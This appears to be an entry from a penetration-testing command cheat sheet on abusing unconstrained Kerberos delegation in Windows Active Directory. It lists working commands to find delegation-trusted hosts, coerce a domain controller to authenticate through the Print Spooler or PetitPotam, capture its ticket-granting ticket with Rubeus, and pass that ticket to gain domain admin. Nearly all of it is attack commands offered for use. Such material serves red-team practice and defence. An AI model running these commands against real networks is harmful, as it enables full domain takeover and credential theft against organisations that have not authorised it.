---
description: |
  Exploit unconstrained Kerberos delegation — computers trusted for delegation cache TGTs of authenticating users. Coerce a DC to authenticate, capture its TGT, and gain domain admin.
commands:
  - have: Credentials
    cmd: |
      # Find unconstrained delegation computers (Impacket)
      findDelegation.py senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27

      # Find unconstrained delegation computers (PowerShell AD module)
      Get-ADComputer -Filter {TrustedForDelegation -eq $true}

      # Find unconstrained delegation computers (PowerView)
      Get-DomainComputer -Unconstrained

      # Trigger authentication to unconstrained host (coerce DC via Print Spooler)
      SpoolSample.exe DC01 UNCONSTRAINED_HOST

      # Trigger authentication to unconstrained host (coerce DC via PetitPotam)
      PetitPotam.py UNCONSTRAINED_HOST DC01

      # Monitor for incoming TGTs on the unconstrained host
      Rubeus.exe monitor /interval:5 /nowrap

      # Use captured TGT — pass the ticket into current session
      Rubeus.exe ptt /ticket:base64_ticket
  - have: Shell
    cmd: |
      # From compromised unconstrained delegation host
      # Monitor for incoming TGTs
      Rubeus.exe monitor /interval:5 /nowrap

      # Coerce DC to authenticate to this host
      SpoolSample.exe DC01 UNCONSTRAINED_HOST

      # Use captured TGT
      Rubeus.exe ptt /ticket:base64_ticket
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Kerberos
  - LDAP
techniques:
  - Delegation_Abuse
references:
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/unconstrained-delegation.html
  - https://github.com/GhostPack/Rubeus
  - https://github.com/leechristensen/SpoolSample
  - https://github.com/topotam/PetitPotam
---
